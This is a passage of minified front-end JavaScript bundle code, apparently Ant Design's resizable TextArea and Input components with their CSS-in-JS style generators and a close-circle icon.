`,p=["letter-spacing","line-height","padding-top","padding-bottom","font-family","font-weight","font-size","font-variant","text-rendering","text-transform","width","text-indent","padding-left","padding-right","border-width","box-sizing","word-break","white-space"],m={};function f(){return(f=Object.assign.bind()).apply(this,arguments)}let g=s.forwardRef((e,r)=>{let{prefixCls:n,defaultValue:o,value:g,autoSize:h,onResize:b,className:y,style:v,disabled:S,onChange:x,onInternalAutoSize:C,...w}=e,[k,$]=(0,a.default)(o,g),E=s.useRef();s.useImperativeHandle(r,()=>({textArea:E.current}));let[P,T]=s.useMemo(()=>h&&"object"==typeof h?[h.minRows,h.maxRows]:[],[h]),I=!!h,[M,R]=s.useState(2),[A,D]=s.useState(),L=()=>{R(0)};(0,c.default)(()=>{I&&L()},[g,P,T,I]),(0,c.default)(()=>{if(0===M)R(1);else if(1===M){let e=function(e,r=!1,n=null,o=null){let a,i,s;t||((t=document.createElement("textarea")).setAttribute("tab-index","-1"),t.setAttribute("aria-hidden","true"),t.setAttribute("name","hiddenTextarea"),document.body.appendChild(t)),e.getAttribute("wrap")?t.setAttribute("wrap",e.getAttribute("wrap")):t.removeAttribute("wrap");let{paddingSize:l,borderSize:c,boxSizing:u,sizingStyle:f}=function(e,t=!1){let r=e.getAttribute("id")||e.getAttribute("data-reactid")||e.getAttribute("name");if(t&&m[r])return m[r];let n=window.getComputedStyle(e),o=n.getPropertyValue("box-sizing")||n.getPropertyValue("-moz-box-sizing")||n.getPropertyValue("-webkit-box-sizing"),a=parseFloat(n.getPropertyValue("padding-bottom"))+parseFloat(n.getPropertyValue("padding-top")),i=parseFloat(n.getPropertyValue("border-bottom-width"))+parseFloat(n.getPropertyValue("border-top-width")),s={sizingStyle:p.map(e=>`${e}:${n.getPropertyValue(e)}`).join(";"),paddingSize:a,borderSize:i,boxSizing:o};return t&&r&&(m[r]=s),s}(e,r);t.setAttribute("style",`${f};${d}`),t.value=e.value||e.placeholder||"";let g=t.scrollHeight;if("border-box"===u?g+=c:"content-box"===u&&(g-=l),null!==n||null!==o){t.value=" ";let e=t.scrollHeight-l;null!==n&&(i=e*n,"border-box"===u&&(i=i+l+c),g=Math.max(i,g)),null!==o&&(s=e*o,"border-box"===u&&(s=s+l+c),a=g>s?"":"hidden",g=Math.min(s,g))}let h={height:g,overflowY:a,resize:"none"};return i&&(h.minHeight=i),s&&(h.maxHeight=s),h}(E.current,!1,P,T);R(2),D(e)}},[M]);let _=s.useRef(),O=()=>{u.default.cancel(_.current)};s.useEffect(()=>O,[]);let N={...v,...I?A:null};return(0===M||1===M)&&(N.overflowY="hidden",N.overflowX="hidden"),s.createElement(l.default,{onResize:e=>{2===M&&(b?.(e),h&&(O(),_.current=(0,u.default)(()=>{L()})))},disabled:!(h||b)},s.createElement("textarea",f({},w,{ref:E,style:N,className:(0,i.clsx)(n,y,{[`${n}-disabled`]:S}),disabled:S,value:k??"",onChange:e=>{$(e.target.value),x?.(e)}})))});function h(){return(h=Object.assign.bind()).apply(this,arguments)}let b=s.default.forwardRef(({defaultValue:e,value:t,onFocus:l,onBlur:c,onChange:u,allowClear:d,maxLength:p,onCompositionStart:m,onCompositionEnd:f,suffix:b,prefixCls:y="rc-textarea",showCount:v,count:S,className:x,style:C,disabled:w,hidden:k,classNames:$,styles:E,onResize:P,onClear:T,onPressEnter:I,readOnly:M,autoSize:R,onKeyDown:A,...D},L)=>{let _,[O,N]=(0,a.default)(e,t),F=null==O?"":String(O),[j,H]=s.default.useState(!1),B=s.default.useRef(!1),[z,V]=s.default.useState(null),W=(0,s.useRef)(null),U=(0,s.useRef)(null),q=()=>U.current?.textArea,G=()=>{q().focus()};(0,s.useImperativeHandle)(L,()=>({resizableTextArea:U.current,focus:G,blur:()=>{q().blur()},nativeElement:W.current?.nativeElement||q()})),(0,s.useEffect)(()=>{H(e=>!w&&e)},[w]);let[J,X]=s.default.useState(null);s.default.useEffect(()=>{J&&q().setSelectionRange(...J)},[J]);let K=(0,n.default)(S,v),Q=K.max??p,Y=Number(Q)>0,Z=K.strategy(F),ee=!!Q&&Z>Q,et=(e,t)=>{let r=t;!B.current&&K.exceedFormatter&&K.max&&K.strategy(t)>K.max&&(r=K.exceedFormatter(t,{max:K.max}),t!==r&&X([q().selectionStart||0,q().selectionEnd||0])),N(r),(0,o.resolveOnChange)(e.currentTarget,e,u,r)},er=b;K.show&&(_=K.showFormatter?K.showFormatter({value:F,count:Z,maxLength:Q}):`${Z}${Y?` / ${Q}`:""}`,er=s.default.createElement(s.default.Fragment,null,er,s.default.createElement("span",{className:(0,i.clsx)(`${y}-data-count`,$?.count),style:E?.count},_)));let en=!R&&!v&&!d;return s.default.createElement(r.default,{ref:W,value:F,allowClear:d,handleReset:e=>{N(""),G(),(0,o.resolveOnChange)(q(),e,u)},suffix:er,prefixCls:y,classNames:{...$,affixWrapper:(0,i.clsx)($?.affixWrapper,{[`${y}-show-count`]:v,[`${y}-textarea-allow-clear`]:d})},disabled:w,focused:j,className:(0,i.clsx)(x,ee&&`${y}-out-of-range`),style:{...C,...z&&!en?{height:"auto"}:{}},dataAttrs:{affixWrapper:{"data-count":"string"==typeof _?_:void 0}},hidden:k,readOnly:M,onClear:T},s.default.createElement(g,h({},D,{autoSize:R,maxLength:p,onKeyDown:e=>{"Enter"===e.key&&I&&!e.nativeEvent.isComposing&&I(e),A?.(e)},onChange:e=>{et(e,e.target.value)},onFocus:e=>{H(!0),l?.(e)},onBlur:e=>{H(!1),c?.(e)},onCompositionStart:e=>{B.current=!0,m?.(e)},onCompositionEnd:e=>{B.current=!1,et(e,e.currentTarget.value),f?.(e)},className:(0,i.clsx)($?.textarea),style:{resize:C?.resize,...E?.textarea},disabled:w,prefixCls:y,onResize:e=>{P?.(e),q()?.style.height&&V(!0)},ref:U,readOnly:M})))});e.s(["default",0,b],63651)},30683,e=>{"use strict";var t=e.i(71645);e.i(47167);let r={icon:{tag:"svg",attrs:{"fill-rule":"evenodd",viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M512 64c247.4 0 448 200.6 448 448S759.4 960 512 960 64 759.4 64 512 264.6 64 512 64zm127.98 274.82h-.04l-.08.06L512 466.75 384.14 338.88c-.04-.05-.06-.06-.08-.06a.12.12 0 00-.07 0c-.03 0-.05.01-.09.05l-45.02 45.02a.2.2 0 00-.05.09.12.12 0 000 .07v.02a.27.27 0 00.06.06L466.75 512 338.88 639.86c-.05.04-.06.06-.06.08a.12.12 0 000 .07c0 .03.01.05.05.09l45.02 45.02a.2.2 0 00.09.05.12.12 0 00.07 0c.02 0 .04-.01.08-.05L512 557.25l127.86 127.87c.04.04.06.05.08.05a.12.12 0 00.07 0c.03 0 .05-.01.09-.05l45.02-45.02a.2.2 0 00.05-.09.12.12 0 000-.07v-.02a.27.27 0 00-.05-.06L557.25 512l127.87-127.86c.04-.04.05-.06.05-.08a.12.12 0 000-.07c0-.03-.01-.05-.05-.09l-45.02-45.02a.2.2 0 00-.09-.05.12.12 0 00-.07 0z"}}]},name:"close-circle",theme:"filled"};var n=e.i(9583);function o(){return(o=Object.assign.bind()).apply(this,arguments)}let a=t.forwardRef((e,a)=>t.createElement(n.default,o({},e,{ref:a,icon:r})));e.s(["default",0,e=>{let r;return"object"==typeof e&&e?.clearIcon?r=e:e&&(r={clearIcon:t.default.createElement(a,null)}),r}],30683)},52956,e=>{"use strict";var t=e.i(7670);e.s(["getMergedStatus",0,(e,t)=>t||e,"getStatusClassNames",0,(e,r,n)=>(0,t.clsx)({[`${e}-status-success`]:"success"===r,[`${e}-status-warning`]:"warning"===r,[`${e}-status-error`]:"error"===r,[`${e}-status-validating`]:"validating"===r,[`${e}-has-feedback`]:n})])},37328,e=>{"use strict";var t=e.i(71645);let r=t.createContext(!1);e.s(["DisabledContextProvider",0,({children:e,disabled:n})=>{let o=t.useContext(r);return t.createElement(r.Provider,{value:n??o},e)},"default",0,r])},49942,72409,17458,e=>{"use strict";e.i(96059);var t=e.i(15654),r=e.i(83293);function n(e,t={focus:!0}){let{componentCls:r}=e,{componentCls:o}=t,a=o||r,i=`${a}-compact`;return{[i]:{...function(e,t,r,n){let{focusElCls:o,focus:a,borderElCls:i}=r,s=i?"> *":"",l=["hover",a?"focus":null,"active"].filter(Boolean).map(e=>`&:${e} ${s}`).join(",");return{[`&-item:not(${t}-last-item)`]:{marginInlineEnd:e.calc(e.lineWidth).mul(-1).equal()},[`&-item:not(${n}-status-success)`]:{zIndex:2},"&-item":{[l]:{zIndex:3},...o?{[`&${o}`]:{zIndex:3}}:{},[`&[disabled] ${s}`]:{zIndex:0}}}}(e,i,t,a),...function(e,t,r){let{borderElCls:n}=r,o=n?`> ${n}`:"";return{[`&-item:not(${t}-first-item):not(${t}-last-item) ${o}`]:{borderRadius:0},[`&-item:not(${t}-last-item)${t}-first-item`]:{[`& ${o}, &${e}-sm ${o}, &${e}-lg ${o}`]:{borderStartEndRadius:0,borderEndEndRadius:0}},[`&-item:not(${t}-first-item)${t}-last-item`]:{[`& ${o}, &${e}-sm ${o}, &${e}-lg ${o}`]:{borderStartStartRadius:0,borderEndStartRadius:0}}}}(a,i,t)}}}e.s(["genCompactItemStyle",()=>n],72409);var o=e.i(46422),a=e.i(38378);function i(e){return(0,a.mergeToken)(e,{inputAffixPadding:e.paddingXXS})}let s=e=>{let{controlHeight:t,fontSize:r,lineHeight:n,lineWidth:o,controlHeightSM:a,controlHeightLG:i,fontSizeLG:s,lineHeightLG:l,paddingSM:c,controlPaddingHorizontalSM:u,controlPaddingHorizontal:d,colorFillAlter:p,colorPrimaryHover:m,colorPrimary:f,controlOutlineWidth:g,controlOutline:h,colorErrorOutline:b,colorWarningOutline:y,colorBgContainer:v,inputFontSize:S,inputFontSizeLG:x,inputFontSizeSM:C}=e,w=S||r,k=C||w,$=x||s;return{paddingBlock:Math.max(Math.round((t-w*n)/2*10)/10-o,0),paddingBlockSM:Math.max(Math.round((a-k*n)/2*10)/10-o,0),paddingBlockLG:Math.max(Math.ceil((i-$*l)/2*10)/10-o,0),paddingInline:c-o,paddingInlineSM:u-o,paddingInlineLG:d-o,addonBg:p,activeBorderColor:f,hoverBorderColor:m,activeShadow:`0 0 0 ${g}px ${h}`,errorActiveShadow:`0 0 0 ${g}px ${b}`,warningActiveShadow:`0 0 0 ${g}px ${y}`,hoverBg:v,activeBg:v,inputFontSize:w,inputFontSizeLG:$,inputFontSizeSM:k}};e.s(["initComponentToken",0,s,"initInputToken",()=>i],17458);let l=e=>{let t;return{color:e.colorTextDisabled,backgroundColor:e.colorBgContainerDisabled,borderColor:e.colorBorder,boxShadow:"none",cursor:"not-allowed",opacity:1,"input[disabled], textarea[disabled]":{cursor:"not-allowed"},"&:hover:not([disabled])":{...{borderColor:(t=(0,a.mergeToken)(e,{hoverBorderColor:e.colorBorder,hoverBg:e.colorBgContainerDisabled})).hoverBorderColor,backgroundColor:t.hoverBg}}}},c=(e,t)=>({background:e.colorBgContainer,borderWidth:e.lineWidth,borderStyle:e.lineType,borderColor:t.borderColor,"&:hover":{borderColor:t.hoverBorderColor,backgroundColor:e.hoverBg},"&:focus, &:focus-within":{borderColor:t.activeBorderColor,boxShadow:t.activeShadow,outline:0,backgroundColor:e.activeBg}}),u=(e,t)=>({[`&${e.componentCls}-status-${t.status}:not(${e.componentCls}-disabled)`]:{...c(e,t),[`${e.componentCls}-prefix, ${e.componentCls}-suffix`]:{color:t.affixColor}},[`&${e.componentCls}-status-${t.status}${e.componentCls}-disabled`]:{borderColor:t.borderColor}}),d=(e,t)=>({[`&${e.componentCls}-group-wrapper-status-${t.status}`]:{[`${e.componentCls}-group-addon`]:{borderColor:t.addonBorderColor,color:t.addonColor}}}),p=(e,t)=>({background:t.bg,borderWidth:e.lineWidth,borderStyle:e.lineType,borderColor:"transparent","input&, & input, textarea&, & textarea":{color:t?.inputColor??"unset"},"&:hover":{background:t.hoverBg},"&:focus, &:focus-within":{outline:0,borderColor:t.activeBorderColor,backgroundColor:e.activeBg}}),m=(e,t)=>({[`&${e.componentCls}-status-${t.status}:not(${e.componentCls}-disabled)`]:{...p(e,t),[`${e.componentCls}-prefix, ${e.componentCls}-suffix`]:{color:t.affixColor}}}),f=(e,t)=>({[`&${e.componentCls}-group-wrapper-status-${t.status}`]:{[`${e.componentCls}-group-addon`]:{background:t.addonBg,color:t.addonColor}}}),g=(e,r)=>({background:e.colorBgContainer,borderWidth:`${(0,t.unit)(e.lineWidth)} 0`,borderStyle:`${e.lineType} none`,borderColor:`transparent transparent ${r.borderColor} transparent`,borderRadius:0,"&:hover":{borderColor:`transparent transparent ${r.hoverBorderColor} transparent`,backgroundColor:e.hoverBg},"&:focus, &:focus-within":{borderColor:`transparent transparent ${r.activeBorderColor} transparent`,outline:0,backgroundColor:e.activeBg}}),h=(e,t)=>({[`&${e.componentCls}-status-${t.status}:not(${e.componentCls}-disabled)`]:{...g(e,t),[`${e.componentCls}-prefix, ${e.componentCls}-suffix`]:{color:t.affixColor}},[`&${e.componentCls}-status-${t.status}${e.componentCls}-disabled`]:{borderColor:`transparent transparent ${t.borderColor} transparent`}}),b=e=>{let{paddingBlockLG:r,lineHeightLG:n,borderRadiusLG:o,paddingInlineLG:a}=e;return{padding:`${(0,t.unit)(r)} ${(0,t.unit)(a)}`,fontSize:e.inputFontSizeLG,lineHeight:n,borderRadius:o}},y=e=>({padding:`${(0,t.unit)(e.paddingBlockSM)} ${(0,t.unit)(e.paddingInlineSM)}`,fontSize:e.inputFontSizeSM,borderRadius:e.borderRadiusSM}),v=(e,r={})=>({position:"relative",display:"inline-block",width:"100%",minWidth:0,padding:`${(0,t.unit)(e.paddingBlock)} ${(0,t.unit)(e.paddingInline)}`,color:e.colorText,fontSize:e.inputFontSize,lineHeight:e.lineHeight,borderRadius:e.borderRadius,transition:`all ${e.motionDurationMid}`,...{"&::-moz-placeholder":{opacity:1},"&::placeholder":{color:e.colorTextPlaceholder,userSelect:"none"},"&:placeholder-shown":{textOverflow:"ellipsis"}},"&-lg":{...b(e),...r.largeStyle},"&-sm":{...y(e),...r.smallStyle},"&-rtl, &-textarea-rtl":{direction:"rtl"}}),S=(0,o.genStyleHooks)(["Input","Shared"],e=>{let n=(0,a.mergeToken)(e,i(e));return[(e=>{let t,n,o,{componentCls:a,controlHeightSM:i,lineWidth:s,calc:d}=e,f=d(i).sub(d(s).mul(2)).sub(16).div(2).equal();return{[a]:{...(0,r.resetComponent)(e),...v(e),...{"&-outlined":{...c(e,{borderColor:e.colorBorder,hoverBorderColor:e.hoverBorderColor,activeBorderColor:e.activeBorderColor,activeShadow:e.activeShadow}),[`&${e.componentCls}-disabled, &[disabled]`]:{...l(e)},...u(e,{status:"error",borderColor:e.colorError,hoverBorderColor:e.colorErrorBorderHover,activeBorderColor:e.colorError,activeShadow:e.errorActiveShadow,affixColor:e.colorError}),...u(e,{status:"warning",borderColor:e.colorWarning,hoverBorderColor:e.colorWarningBorderHover,activeBorderColor:e.colorWarning,activeShadow:e.warningActiveShadow,affixColor:e.colorWarning}),...t}},...{"&-filled":{...p(e,{bg:e.colorFillTertiary,hoverBg:e.colorFillSecondary,activeBorderColor:e.activeBorderColor,inputColor:e.colorText}),[`&${e.componentCls}-disabled, &[disabled]`]:{...l(e)},...m(e,{status:"error",bg:e.colorErrorBg,hoverBg:e.colorErrorBgHover,activeBorderColor:e.colorError,inputColor:e.colorErrorText,affixColor:e.colorError}),...m(e,{status:"warning",bg:e.colorWarningBg,hoverBg:e.colorWarningBgHover,activeBorderColor:e.colorWarning,inputColor:e.colorWarningText,affixColor:e.colorWarning}),...n}},...((e,t)=>{let{componentCls:r}=e;return{"&-borderless":{background:"transparent",border:"none",paddingBlock:e.calc(e.paddingBlock).add(e.lineWidth).equal(),[`&${r}-sm, &${r}-affix-wrapper-sm`]:{paddingBlock:e.calc(e.paddingBlockSM).add(e.lineWidth).equal()},[`&${r}-lg, &${r}-affix-wrapper-lg`]:{paddingBlock:e.calc(e.paddingBlockLG).add(e.lineWidth).equal()},"&:focus, &:focus-within":{outline:"none"},[`&${r}-disabled, &[disabled]`]:{color:e.colorTextDisabled,cursor:"not-allowed"},[`&${r}-status-error`]:{"&, & input, & textarea":{color:e.colorError}},[`&${r}-status-warning`]:{"&, & input, & textarea":{color:e.colorWarning}},...t}}})(e),...{"&-underlined":{...g(e,{borderColor:e.colorBorder,hoverBorderColor:e.hoverBorderColor,activeBorderColor:e.activeBorderColor,activeShadow:e.activeShadow}),[`&${e.componentCls}-disabled, &[disabled]`]:{color:e.colorTextDisabled,boxShadow:"none",cursor:"not-allowed","&:hover":{borderColor:`transparent transparent ${e.colorBorder} transparent`}},"input[disabled], textarea[disabled]":{cursor:"not-allowed"},...h(e,{status:"error",borderColor:e.colorError,hoverBorderColor:e.colorErrorBorderHover,activeBorderColor:e.colorError,activeShadow:e.errorActiveShadow,affixColor:e.colorError}),...h(e,{status:"warning",borderColor:e.colorWarning,hoverBorderColor:e.colorWarningBorderHover,activeBorderColor:e.colorWarning,activeShadow:e.warningActiveShadow,affixColor:e.colorWarning}),...o}},'&[type="color"]':{height:e.controlHeight,[`&${a}-lg`]:{height:e.controlHeightLG},[`&${a}-sm`]:{height:i,paddingTop:f,paddingBottom:f}},'&[type="search"]::-webkit-search-cancel-button, &[type="search"]::-webkit-search-decoration':{appearance:"none"}}}})(n),(e=>{let{componentCls:r,inputAffixPadding:n,colorTextDescription:o,motionDurationSlow:a,colorIcon:i,colorIconHover:s,iconCls:l}=e,c=`${r}-affix-wrapper`,u=`${r}-affix-wrapper-disabled`;return{[c]:{...v(e),display:"inline-flex","&-focused, &:focus":{zIndex:1},[`> input${r}`]:{padding:0},[`> input${r}, > textarea${r}`]:{fontSize:"inherit",border:"none",borderRadius:0,outline:"none",background:"transparent",color:"inherit","&::-ms-reveal":{display:"none"},"&:focus":{boxShadow:"none !important"}},"&::before":{display:"inline-block",width:0,visibility:"hidden",content:'"\\a0"'},[r]:{"&-prefix, &-suffix":{display:"flex",flex:"none",alignItems:"center","> *:not(:last-child)":{marginInlineEnd:e.paddingXS}},"&-show-count-suffix":{color:o,direction:"ltr"},"&-show-count-has-suffix":{marginInlineEnd:e.paddingXXS},"&-prefix":{marginInlineEnd:n},"&-suffix":{marginInlineStart:n}},...(e=>{let{componentCls:r}=e;return{[`${r}-clear-icon`]:{margin:0,padding:0,lineHeight:0,color:e.colorTextQuaternary,fontSize:e.fontSizeIcon,verticalAlign:-1,cursor:"pointer",transition:`color ${e.motionDurationSlow}`,border:"none",outline:"none",backgroundColor:"transparent","&:hover":{color:e.colorIcon},"&:active":{color:e.colorText},"&-hidden":{visibility:"hidden"},"&-has-suffix":{margin:`0 ${(0,t.unit)(e.inputAffixPadding)}`}}}})(e),[`${l}${r}-password-icon`]:{color:i,cursor:"pointer",transition:`all ${a}`,"&:hover":{color:s}}},[`${r}-underlined`]:{borderRadius:0},[u]:{[`${l}${r}-password-icon`]:{color:i,cursor:"not-allowed","&:hover":{color:i}}}}})(n)]},s,{resetFont:!1}),x=(0,o.genStyleHooks)(["Input","Component"],e=>{let o=(0,a.mergeToken)(e,i(e));return[(e=>{let{componentCls:n,borderRadiusLG:o,borderRadiusSM:a}=e;return{[`${n}-group`]:{...(0,r.resetComponent)(e),...(e=>{let{componentCls:n,antCls:o}=e;return{position:"relative",display:"table",width:"100%",borderCollapse:"separate",borderSpacing:0,"&[class*='col-']":{paddingInlineEnd:e.paddingXS,"&:last-child":{paddingInlineEnd:0}},[`&-lg ${n}, &-lg > ${n}-group-addon`]:{...b(e)},[`&-sm ${n}, &-sm > ${n}-group-addon`]:{...y(e)},[`&-lg ${o}-select-single`]:{height:e.controlHeightLG},[`&-sm ${o}-select-single`]:{height:e.controlHeightSM},[`> ${n}`]:{display:"table-cell","&:not(:first-child):not(:last-child)":{borderRadius:0}},[`${n}-group`]:{"&-addon, &-wrap":{display:"table-cell",width:1,whiteSpace:"nowrap",verticalAlign:"middle","&:not(:first-child):not(:last-child)":{borderRadius:0}},"&-wrap > *":{display:"block !important"},"&-addon":{position:"relative",padding:`0 ${(0,t.unit)(e.paddingInline)}`,color:e.colorText,fontWeight:"normal",fontSize:e.inputFontSize,textAlign:"center",borderRadius:e.borderRadius,transition:`all ${e.motionDurationSlow}`,lineHeight:1,[`${o}-select`]:{margin:`${(0,t.unit)(e.calc(e.paddingBlock).add(1).mul(-1).equal())} ${(0,t.unit)(e.calc(e.paddingInline).mul(-1).equal())}`,[`&${o}-select-single:not(${o}-select-customize-input):not(${o}-pagination-size-changer)`]:{backgroundColor:"inherit",border:`${(0,t.unit)(e.lineWidth)} ${e.lineType} transparent`,boxShadow:"none"}},[`${o}-cascader-picker`]:{margin:`-9px ${(0,t.unit)(e.calc(e.paddingInline).mul(-1).equal())}`,backgroundColor:"transparent",[`${o}-cascader-input`]:{textAlign:"start",border:0,boxShadow:"none"}}}},[n]:{width:"100%",marginBottom:0,textAlign:"inherit","&:focus":{zIndex:1,borderInlineEndWidth:1},"&:hover":{zIndex:1,borderInlineEndWidth:1}},[`> ${n}:first-child, ${n}-group-addon:first-child`]:{borderStartEndRadius:0,borderEndEndRadius:0,[`${o}-select`]:{borderStartEndRadius:0,borderEndEndRadius:0}},[`> ${n}-affix-wrapper`]:{[`&:not(:first-child) ${n}`]:{borderStartStartRadius:0,borderEndStartRadius:0},[`&:not(:last-child) ${n}`]:{borderStartEndRadius:0,borderEndEndRadius:0}},[`> ${n}:last-child, ${n}-group-addon:last-child`]:{borderStartStartRadius:0,borderEndStartRadius:0,[`${o}-select`]:{borderStartStartRadius:0,borderEndStartRadius:0}},[`${n}-affix-wrapper`]:{"&:not(:last-child)":{borderStartEndRadius:0,borderEndEndRadius:0},"&:not(:first-child)":{borderStartStartRadius:0,borderEndStartRadius:0}},[`&${n}-group-compact`]:{display:"block",...(0,r.clearFix)(),[`${n}-group-addon, ${n}-group-wrap, > ${n}`]:{"&:not(:first-child):not(:last-child)":{borderInlineEndWidth:e.lineWidth,"&:hover, &:focus":{zIndex:1}}},"& > *":{display:"inline-flex",float:"none",verticalAlign:"top",borderRadius:0},[`
        & > ${n}-affix-wrapper,
        & > ${n}-number-affix-wrapper,
        & > ${o}-picker-range
      `]:{display:"inline-flex"},"& > *:not(:last-child)":{marginInlineEnd:e.calc(e.lineWidth).mul(-1).equal(),borderInlineEndWidth:e.lineWidth},[n]:{float:"none"},[`& > ${o}-select,
      & > ${o}-select-auto-complete ${n},
      & > ${o}-cascader-picker ${n},
      & > ${n}-group-wrapper ${n}`]:{borderInlineEndWidth:e.lineWidth,borderRadius:0,"&:hover, &:focus":{zIndex:1}},[`& > ${o}-select-focused`]:{zIndex:1},[`& > ${o}-select > ${o}-select-arrow`]:{zIndex:1},[`& > *:first-child,
      & > ${o}-select:first-child,
      & > ${o}-select-auto-complete:first-child ${n},
      & > ${o}-cascader-picker:first-child ${n}`]:{borderStartStartRadius:e.borderRadius,borderEndStartRadius:e.borderRadius},[`& > *:last-child,
      & > ${o}-select:last-child,
      & > ${o}-cascader-picker:last-child ${n},
      & > ${o}-cascader-picker-focused:last-child ${n}`]:{borderInlineEndWidth:e.lineWidth,borderStartEndRadius:e.borderRadius,borderEndEndRadius:e.borderRadius},[`& > ${o}-select-auto-complete ${n}`]:{verticalAlign:"top"},[`${n}-group-wrapper + ${n}-group-wrapper`]:{marginInlineStart:e.calc(e.lineWidth).mul(-1).equal(),[`${n}-affix-wrapper`]:{}}}}})(e),"&-rtl":{direction:"rtl"},"&-wrapper":{display:"inline-block",width:"100%",textAlign:"start",verticalAlign:"top","&-rtl":{direction:"rtl"},"&-lg":{[`${n}-group-addon`]:{borderRadius:o,fontSize:e.inputFontSizeLG}},"&-sm":{[`${n}-group-addon`]:{borderRadius:a}},...{"&-outlined":{[`${e.componentCls}-group`]:{"&-addon":{background:e.addonBg,border:`${(0,t.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`},"&-addon:first-child":{borderInlineEnd:0},"&-addon:last-child":{borderInlineStart:0}},...d(e,{status:"error",addonBorderColor:e.colorError,addonColor:e.colorErrorText}),...d(e,{status:"warning",addonBorderColor:e.colorWarning,addonColor:e.colorWarningText}),[`&${e.componentCls}-group-wrapper-disabled`]:{[`${e.componentCls}-group-addon`]:{...l(e)}}}},...{"&-filled":{[`${e.componentCls}-group-addon`]:{background:e.colorFillTertiary,"&:last-child":{position:"static"}},...f(e,{status:"error",addonBg:e.colorErrorBg,addonColor:e.colorErrorText}),...f(e,{status:"warning",addonBg:e.colorWarningBg,addonColor:e.colorWarningText}),[`&${e.componentCls}-group-wrapper-disabled`]:{[`${e.componentCls}-group`]:{"&-addon":{background:e.colorFillTertiary,color:e.colorTextDisabled},"&-addon:first-child":{borderInlineStart:`${(0,t.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`,borderTop:`${(0,t.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`,borderBottom:`${(0,t.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`},"&-addon:last-child":{borderInlineEnd:`${(0,t.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`,borderTop:`${(0,t.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`,borderBottom:`${(0,t.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`}}}}},[`&:not(${n}-compact-first-item):not(${n}-compact-last-item)${n}-compact-item`]:{[`${n}, ${n}-group-addon`]:{borderRadius:0}},[`&:not(${n}-compact-last-item)${n}-compact-first-item`]:{[`${n}, ${n}-group-addon`]:{borderStartEndRadius:0,borderEndEndRadius:0}},[`&:not(${n}-compact-first-item)${n}-compact-last-item`]:{[`${n}, ${n}-group-addon`]:{borderStartStartRadius:0,borderEndStartRadius:0}},[`&:not(${n}-compact-last-item)${n}-compact-item`]:{[`${n}-affix-wrapper`]:{borderStartEndRadius:0,borderEndEndRadius:0}},[`&:not(${n}-compact-first-item)${n}-compact-item`]:{[`${n}-affix-wrapper`]:{borderStartStartRadius:0,borderEndStartRadius:0}}}}}})(o),(e=>{let{componentCls:t}=e;return{[`${t}-out-of-range`]:{[`&, & input, & textarea, ${t}-show-count-suffix, ${t}-data-count`]:{color:e.colorError}}}})(o),n(o,{focus:!0,focusElCls:`${o.componentCls}-affix-wrapper-focused`})]},s,{resetFont:!1});e.s(["default",0,x,"useSharedStyle",0,S],49942)},35432,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(63651),n=e.i(7670),o=e.i(30683),a=e.i(11517),i=e.i(52956),s=e.i(42064),l=e.i(37328),c=e.i(21883),u=e.i(17455),d=e.i(62139),p=e.i(92812),m=e.i(87166),f=e.i(63611),g=e.i(49942),h=e.i(46422),b=e.i(38378),y=e.i(17458);let v=(0,h.genStyleHooks)(["Input","TextArea"],e=>(e=>{let{componentCls:t,paddingLG:r}=e,n=`${t}-textarea`;return{[`textarea${t}`]:{maxWidth:"100%",height:"auto",minHeight:e.controlHeight,lineHeight:e.lineHeight,verticalAlign:"bottom",transition:`all ${e.motionDurationSlow}`,resize:"vertical",[`&${t}-mouse-active`]:{transition:`all ${e.motionDurationSlow}, height 0s, width 0s`}},[`${t}-textarea-affix-wrapper-resize-dirty`]:{width:"auto"},[n]:{position:"relative","&-show-count":{[`${t}-data-count`]:{position:"absolute",bottom:e.calc(e.fontSize).mul(e.lineHeight).mul(-1).equal(),insetInlineEnd:0,color:e.colorTextDescription,whiteSpace:"nowrap",pointerEvents:"none"}},[`
        &-allow-clear > ${t},
        &-affix-wrapper${n}-has-feedback ${t}
      `]:{paddingInlineEnd:r},[`&-affix-wrapper${t}-affix-wrapper`]:{padding:0,[`> textarea${t}`]:{fontSize:"inherit",border:"none",outline:"none",background:"transparent",minHeight:e.calc(e.controlHeight).sub(e.calc(e.lineWidth).mul(2)).equal(),"&:focus":{boxShadow:"none !important"}},[`${t}-suffix`]:{margin:0,"> *:not(:last-child)":{marginInline:0},[`${t}-clear-icon`]:{position:"absolute",insetInlineEnd:e.paddingInline,insetBlockStart:e.paddingXS},[`${n}-suffix`]:{position:"absolute",top:0,insetInlineEnd:e.paddingInline,bottom:0,zIndex:1,display:"inline-flex",alignItems:"center",margin:"auto",pointerEvents:"none"}}},[`&-affix-wrapper${t}-affix-wrapper-rtl`]:{[`${t}-suffix`]:{[`${t}-data-count`]:{direction:"ltr",insetInlineStart:0}}},[`&-affix-wrapper${t}-affix-wrapper-sm`]:{[`${t}-suffix`]:{[`${t}-clear-icon`]:{insetInlineEnd:e.paddingInlineSM}}}}}})((0,b.mergeToken)(e,(0,y.initInputToken)(e))),y.initComponentToken,{resetFont:!1}),S=(0,t.forwardRef)((e,h)=>{let{prefixCls:b,bordered:y=!0,size:S,disabled:x,status:C,allowClear:w,classNames:k,rootClassName:$,className:E,style:P,styles:T,variant:I,showCount:M,onMouseDown:R,onResize:A,...D}=e,{getPrefixCls:L,direction:_,allowClear:O,autoComplete:N,className:F,style:j,classNames:H,styles:B}=(0,s.useComponentConfig)("textArea"),z=t.useContext(l.default),{status:V,hasFeedback:W,feedbackIcon:U}=t.useContext(d.FormItemInputContext),q=(0,i.getMergedStatus)(V,C),[G,J]=(0,a.useMergeSemantic)([H,k],[B,T],{props:e}),X=t.useRef(null);t.useImperativeHandle(h,()=>({resizableTextArea:X.current?.resizableTextArea,focus:e=>{(0,f.triggerFocus)(X.current?.resizableTextArea?.textArea,e)},blur:()=>X.current?.blur(),nativeElement:X.current?.nativeElement||null}));let 